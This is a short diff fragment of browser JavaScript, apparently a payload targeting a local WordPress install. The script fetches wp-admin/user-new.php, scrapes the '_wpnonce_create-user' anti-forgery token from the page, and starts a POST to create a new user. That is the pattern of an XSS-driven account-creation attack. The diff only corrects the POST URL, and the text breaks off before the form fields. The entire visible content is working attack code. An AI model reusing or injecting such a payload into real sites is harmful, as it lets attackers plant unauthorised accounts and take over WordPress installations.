@@ -2,7 +2,7 @@ fetch('http://localhost:8012/wordpress/wp-admin/user-new.php')
   .then(response => response.text())
   .then(html => {
     const tokenValue = (new DOMParser().parseFromString(html, 'text/html')).querySelector('form[method="post"] input#_wpnonce_create-user').value;
-        fetch('http://localhost:8012/wordpress/wordpress/wp-admin/user-new.php', {
+        fetch('http://localhost:8012/wordpress/wp-admin/user-new.php', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded'
